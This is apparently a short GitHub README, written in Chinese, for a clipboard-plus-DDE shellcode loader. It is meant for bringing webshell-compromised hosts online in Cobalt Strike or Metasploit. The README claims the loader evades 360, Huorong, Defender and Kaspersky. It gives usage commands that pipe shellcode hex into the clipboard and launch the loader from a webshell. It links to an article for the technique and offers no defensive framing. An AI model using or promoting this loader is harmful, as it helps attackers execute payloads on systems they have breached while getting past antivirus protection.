# Clipboard_DDE_loader

生成的剪贴板+DDE组合的加载器，只能用于webshell上线cs、msf或执行某些shellcode，不能用于钓鱼上线。

原理看之前文章吧，64位效果比32位好

2022/2/11静态+动态基本能过360、火绒、def、卡巴等

卡巴斯基内存查杀主要看你shellcode能不能过了

![image](https://user-images.githubusercontent.com/50757673/153533509-104ad517-73f6-47fe-9ad9-29cec7c9e626.png)


用法：webshell命令行下执行
```
echo fc4883e4f0e8c00000004... | clip
start Clipboard_DDE.exe
```

原理：
https://mp.weixin.qq.com/s/0AQzguAU8mS2ktbs-kUF3w
